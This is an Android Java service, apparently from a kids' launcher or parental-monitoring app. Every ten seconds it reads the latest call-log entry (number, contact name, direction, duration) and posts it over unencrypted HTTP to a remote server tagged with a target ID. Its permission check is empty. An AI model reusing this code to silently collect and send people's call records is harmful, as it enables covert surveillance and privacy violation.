package com.example.marwa.launcher002.services;

import android.Manifest;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.IBinder;
import android.provider.CallLog;
import android.support.annotation.Nullable;
import android.support.v4.content.ContextCompat;
import android.util.Log;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.example.marwa.launcher002.MainActivity;
import com.example.marwa.launcher002.utils.WSadressIP;

import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;
import java.util.Timer;
import java.util.TimerTask;




public class CallsHistory extends Service {
    private Timer timer = new Timer();

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    @Override
    public void onCreate()
    {
        super.onCreate();

      timer.scheduleAtFixedRate(new TimerTask() {

            @Override
            public void run() {

                getCallsDetails(getApplicationContext());






            }
        }, 0, 10000);
    }

    @Override
    public void onDestroy()
    {
        super.onDestroy();
    }




    public void getCallsDetails (Context context){
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {

        }

        String[] details = new String[]{CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DURATION,
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls._ID,


        };

        Cursor cursor;

        cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, details, null, null, CallLog.Calls._ID + " DESC");

        if(cursor.getCount()!=0) {
             cursor.moveToFirst();

                String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));

                String number = cursor.getString(0);
                String type = cursor.getString(1);
                String duration = cursor.getString(2);
                // String name = cursor.getString(3);
                String id = cursor.getString(4);
                String dir = null;



                Date c = Calendar.getInstance().getTime();
                String date = c.toString();


                SimpleDateFormat df = new SimpleDateFormat("dd-MM-yyyy hh:mm");
                String formattedDate = df.format(c);


                int dircode = Integer.parseInt(type);
                switch (dircode) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        dir = "OUTGOING";
                        break;
                    case CallLog.Calls.INCOMING_TYPE:
                        dir = "INCOMING";
                        break;

                    case CallLog.Calls.MISSED_TYPE:
                        dir = "MISSED";
                        break;

                    case CallLog.Calls.REJECTED_TYPE:
                        dir = "REJECTED";
                        break;
                    case CallLog.Calls.BLOCKED_TYPE:
                        dir = "BLOCKED";
                        break;
                }


                if (name == null) {
                    name = "NotSaved.";
                }
                AddCallLineDB(id, name, number, dir, duration, formattedDate);
                 NotifDB(dir , number,id);



            }
            cursor.close();


    }


    public void AddCallLineDB(final String cid,final String name, final String cnumber, final String cdir, final String cduration, final String cdate){

        try {
           Log.d("onrecieve", "on recieveeeeeeeeee Call");

          final String   URL =  "http://"+ WSadressIP.WSIPChoko+"/kidslanch_serv/web/index.php/calls/add";
            StringRequest stringRequest = new StringRequest(Request.Method.POST, URL, new Response.Listener<String>() {
                @Override
                public void onResponse(String response) {
                    if(response.contains("success")) {
                        //NotifDB(cdir , cnumber,cid);
                    }
                }
            }, new Response.ErrorListener() {
                @Override
                public void onErrorResponse(VolleyError error) {
                    //
                }
            }){
                @Override
                protected Map<String, String> getParams() throws AuthFailureError {
                    Map<String, String> params = new HashMap<>();
                    params.put("Content-Type","application/x-www-form-urlencoded");
                    params.put("_c_id", cid);
                    params.put("_c_number",cnumber);
                    params.put("_c_dir", cdir);
                    params.put("_c_duration", cduration);
                    params.put("_c_date", cdate);

                    params.put("_c_name", name);
                    params.put("_id_target", MainActivity.id_target);
                    return params;
                }
            };
            Volley.newRequestQueue(CallsHistory.this).add(stringRequest);

          Log.d("mytag", "OK IM HERE EVERYONE"); // THIS WORKS


        } catch (Exception e){
            e.printStackTrace();
        }

    }



    final String   URL_Notif =  "http://"+ WSadressIP.WSIPChoko+"/kidslanch_serv/web/index.php/notifs/add";

    public void NotifDB(final String typedOfCall , final String number, final String cid) {



        StringRequest stringRequest = new StringRequest(Request.Method.POST, URL_Notif,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {

                    }
                },
                new Response.ErrorListener() {
                    @Override
                    public void onErrorResponse(VolleyError error) {

                    }
                }){
            @Override
            protected Map<String, String> getParams() throws AuthFailureError {
                Map<String, String> params = new HashMap<>();
                params.put("Content-Type","application/x-www-form-urlencoded");
                Date c = Calendar.getInstance().getTime();
                SimpleDateFormat df = new SimpleDateFormat("dd-MM-yyyy hh:mm:ss");
                String formattedDate = df.format(c);
                params.put("date", formattedDate);
                params.put("content", "Call: "+typedOfCall+" number: "+number+" id: "+cid);
                params.put("id_target", MainActivity.id_target);
                return params;
            }
        };

        //adding our stringrequest to queue
        Volley.newRequestQueue(CallsHistory.this).add(stringRequest);

    }




}
